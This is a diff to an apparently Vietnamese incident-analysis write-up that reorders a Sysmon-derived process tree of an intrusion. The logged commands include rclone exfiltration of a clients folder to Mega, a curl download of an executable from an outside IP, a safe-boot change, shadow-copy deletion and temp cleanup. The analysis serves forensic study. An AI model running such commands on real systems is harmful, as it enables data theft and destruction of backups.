@@ -371,6 +371,7 @@ index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1
 ```
 
 ![alt text](images/image-12.png)
+
 Duy trì beacon tới 54.93.105.22:80 khoảng 10 requests mỗi 10 phút trong khoảng hơn 1h
 
 ```spl
@@ -531,6 +532,7 @@ Process tree:
                                                   [6068] C:\Windows\PSEXESVC.exe
 2025-03-21 16:06:43  swhite   Medium  0x141b52d   └── [6712] "whoami"
 
+
                                                   [4520] C:\Windows\Pancake.jpg.exe
 2025-03-21 16:12:04  SYSTEM   System  0x3e7       ├── [1356] C:\Windows\system32\cmd.exe /C whoami
 2025-03-21 16:12:04  SYSTEM   System  0x3e7       │   └── [6276] whoami
@@ -540,10 +542,29 @@ Process tree:
 2025-03-21 16:36:07  SYSTEM   System  0x3e7       │   └── [6552] powershell  Expand-Archive -LiteralPath C:\Users\swhite\AppData\Local\Temp\rclone-v1.69.1-windows-amd64.zip' -DestinationPath C:\Users\swhite\AppData\Local\Temp
 2025-03-21 16:37:10  SYSTEM   System  0x3e7       ├── [3448] C:\Windows\system32\cmd.exe /C powershell Expand-Archive -LiteralPath "C:\Users\swhite\AppData\Local\Temp\rclone-v1.69.1-windows-amd64.zip" -DestinationPath "C:\Users\swhite\AppData\Local\Temp"
 2025-03-21 16:37:10  SYSTEM   System  0x3e7       │   └── [6628] powershell  Expand-Archive -LiteralPath "C:\Users\swhite\AppData\Local\Temp\rclone-v1.69.1-windows-amd64.zip" -DestinationPath "C:\Users\swhite\AppData\Local\Temp"
+
+
+                                                  [2004] C:\Windows\explorer.exe
+2025-03-21 16:37:57  swhite   Medium  0x107346c   ├── [8] "C:\Users\swhite\AppData\Local\Temp\rclone-v1.69.1-windows-amd64\rclone.exe"
+2025-03-21 16:38:07  swhite   Medium  0x107346c   ├── [4116] "C:\Windows\System32\cmd.exe"
+2025-03-21 16:38:09  swhite   Medium  0x107346c   │   ├── [6288] rclone
+2025-03-21 16:38:15  swhite   Medium  0x107346c   │   └── [2244] rclone  config
+
+
+                                                  [4520] C:\Windows\Pancake.jpg.exe
 2025-03-21 16:41:15  SYSTEM   System  0x3e7       ├── [5988] C:\Windows\system32\cmd.exe /C powershell Compress-Archive -Path "C:\clients" -DestinationPath C:\Users\swhite\AppData\Local\Temp\rclone-v1.69.1-windows-amd64\data.zip" -Force
 2025-03-21 16:41:15  SYSTEM   System  0x3e7       │   └── [6932] powershell  Compress-Archive -Path "C:\clients" -DestinationPath C:\Users\swhite\AppData\Local\Temp\rclone-v1.69.1-windows-amd64\data.zip" -Force
 2025-03-21 16:42:18  SYSTEM   System  0x3e7       ├── [4288] C:\Windows\system32\cmd.exe /C rclone copy data.zip mega:data
 2025-03-21 16:42:18  SYSTEM   System  0x3e7       │   └── [2996] rclone  copy data.zip mega:data
+
+
+                                                  [2004] C:\Windows\explorer.exe
+2025-03-21 16:42:40  swhite   Medium  0x107346c   ├── [5788] "C:\Windows\System32\cmd.exe"
+2025-03-21 16:42:42  swhite   Medium  0x107346c   │   ├── [1660] rclone  copy data.zip mega:data
+2025-03-21 16:43:29  swhite   Medium  0x107346c   │   └── [4556] rclone  copy data.zip mega:data --verbose
+
+
+                                                  [4520] C:\Windows\Pancake.jpg.exe
 2025-03-21 16:45:19  SYSTEM   System  0x3e7       ├── [5972] C:\Windows\system32\cmd.exe /C bcdedit.exe /set safeboot network
 2025-03-21 16:45:19  SYSTEM   System  0x3e7       │   └── [6388] bcdedit.exe  /set safeboot network
 2025-03-21 16:47:19  SYSTEM   System  0x3e7       ├── [6916] C:\Windows\system32\cmd.exe /C curl -o "C:\Users\swhite\AppData\Local\Temp\6as98v.exe" http://54.93.105.22/6as98v.exe
@@ -555,20 +576,17 @@ Process tree:
 2025-03-21 16:49:19  SYSTEM   System  0x3e7       │           │   └── [3380] C:\Windows\SysNative\vssadmin.exe  delete shadows /all /quiet
 2025-03-21 16:49:20  SYSTEM   System  0x3e7       │           └── [5724] C:\Windows\system32\cmd.exe /c C:\Windows\System32\vssadmin.exe delete shadows /all /quiet
 2025-03-21 16:49:20  SYSTEM   System  0x3e7       │               └── [6640] C:\Windows\System32\vssadmin.exe  delete shadows /all /quiet
+
+
+                                                  [2004] C:\Windows\explorer.exe
+2025-03-21 16:49:34  swhite   Medium  0x107346c   ├── [100] "C:\Windows\system32\taskmgr.exe" /4
+2025-03-21 16:49:45  swhite   High    0x1073366   └── [6292] "C:\Windows\system32\taskmgr.exe" /4
+
+
+                                                  [4520] C:\Windows\Pancake.jpg.exe
 2025-03-21 16:53:30  SYSTEM   System  0x3e7       └── [6532] C:\Windows\system32\cmd.exe /C cmd /c powershell Remove-Item -Path "C:\Users\swhite\Appdata\Local\Temp\*" -Recurse -Force
 2025-03-21 16:53:30  SYSTEM   System  0x3e7           └── [6664] cmd  /c powershell Remove-Item -Path "C:\Users\swhite\Appdata\Local\Temp\*" -Recurse -Force
 2025-03-21 16:53:30  SYSTEM   System  0x3e7               └── [5708] powershell  Remove-Item -Path "C:\Users\swhite\Appdata\Local\Temp\*" -Recurse -Force
-
-                                                  [2004] C:\Windows\explorer.exe
-2025-03-21 16:37:57  swhite   Medium  0x107346c   ├── [8] "C:\Users\swhite\AppData\Local\Temp\rclone-v1.69.1-windows-amd64\rclone.exe"
-2025-03-21 16:38:07  swhite   Medium  0x107346c   ├── [4116] "C:\Windows\System32\cmd.exe"
-2025-03-21 16:38:09  swhite   Medium  0x107346c   │   ├── [6288] rclone
-2025-03-21 16:38:15  swhite   Medium  0x107346c   │   └── [2244] rclone  config
-2025-03-21 16:42:40  swhite   Medium  0x107346c   ├── [5788] "C:\Windows\System32\cmd.exe"
-2025-03-21 16:42:42  swhite   Medium  0x107346c   │   ├── [1660] rclone  copy data.zip mega:data
-2025-03-21 16:43:29  swhite   Medium  0x107346c   │   └── [4556] rclone  copy data.zip mega:data --verbose
-2025-03-21 16:49:34  swhite   Medium  0x107346c   ├── [100] "C:\Windows\system32\taskmgr.exe" /4
-2025-03-21 16:49:45  swhite   High    0x1073366   └── [6292] "C:\Windows\system32\taskmgr.exe" /4
 ```
 
 **Từ 2025-03-21 16:06:43 đến trước 2025-03-21 16:12:04:**
